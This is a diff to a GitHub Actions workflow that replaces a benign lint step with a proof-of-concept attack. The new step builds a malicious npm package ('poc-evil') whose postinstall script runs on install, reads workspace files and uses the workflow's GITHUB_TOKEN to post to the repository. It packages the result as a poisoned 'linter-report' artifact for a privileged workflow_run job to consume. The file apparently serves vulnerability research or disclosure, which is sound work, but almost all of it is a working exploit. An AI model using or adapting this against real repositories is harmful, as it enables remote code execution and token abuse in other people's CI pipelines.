@@ -8,4 +8,64 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "benign upstream standing in for the repo's real Lint workflow"
+      - name: Craft attacker artifact consumed by privileged workflow_run
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set -e
+          mkdir -p out/pkg
+          cat > out/pkg/package.json <<'JSON'
+          {"name":"poc-evil","version":"6.0.0","scripts":{"postinstall":"node postinstall.js"}}
+          JSON
+          cat > out/pkg/postinstall.js <<'JS'
+          const fs = require('fs');
+          const path = require('path');
+          const ws = process.env.GITHUB_WORKSPACE || process.cwd();
+          const nonce = fs.readFileSync(path.join(ws, 'nonce.txt'), 'utf8').trim();
+          const pr = fs.readFileSync(path.join(ws, 'pr-number.txt'), 'utf8').trim();
+          const proof = {
+            nonce,
+            event: process.env.GITHUB_EVENT_NAME,
+            repo: process.env.GITHUB_REPOSITORY,
+            workflow: process.env.GITHUB_WORKFLOW,
+            token_present: !!process.env.GITHUB_TOKEN,
+            cwd: process.cwd()
+          };
+          console.log('POC_RCE_POSTINSTALL nonce=' + nonce);
+          fs.writeFileSync('/tmp/POC_RCE_PROOF.json', JSON.stringify(proof, null, 2));
+          (async () => {
+            try {
+              const r = await fetch('https://api.github.com/repos/' + proof.repo + '/issues/' + pr + '/comments', {
+                method: 'POST',
+                headers: {
+                  'Accept': 'application/vnd.github+json',
+                  'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN,
+                  'Content-Type': 'application/json',
+                  'X-GitHub-Api-Version': '2022-11-28'
+                },
+                body: JSON.stringify({ body: 'POC_RCE_FRESH nonce=' + nonce + ' workflow=' + proof.workflow + ' at ' + new Date().toISOString() })
+              });
+              proof.token_api_status = r.status;
+              fs.writeFileSync('/tmp/POC_RCE_PROOF.json', JSON.stringify(proof, null, 2));
+            } catch (e) {
+              proof.token_api_error = String(e);
+              fs.writeFileSync('/tmp/POC_RCE_PROOF.json', JSON.stringify(proof, null, 2));
+            }
+          })();
+          JS
+          (cd out/pkg && npm pack --silent >/dev/null)
+          mv out/pkg/poc-evil-6.0.0.tgz out/poc-evil-6.0.0.tgz
+          rm -rf out/pkg
+          printf '%s' '{"name":"root-poc","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil-6.0.0.tgz"}}' > out/package.json
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
+          printf 'attacker report for nonce-run\n' > out/linter-report.txt
+          printf '%s' "$PR_NUMBER" > out/pr-number.txt
+          printf 'FRESH-POC-%s-%s\n' "$GITHUB_RUN_ID" "$(date +%s)" > out/nonce.txt
+          ls -la out
+      - name: Upload poisoned linter-report artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: out/
+          include-hidden-files: true
+          if-no-files-found: error
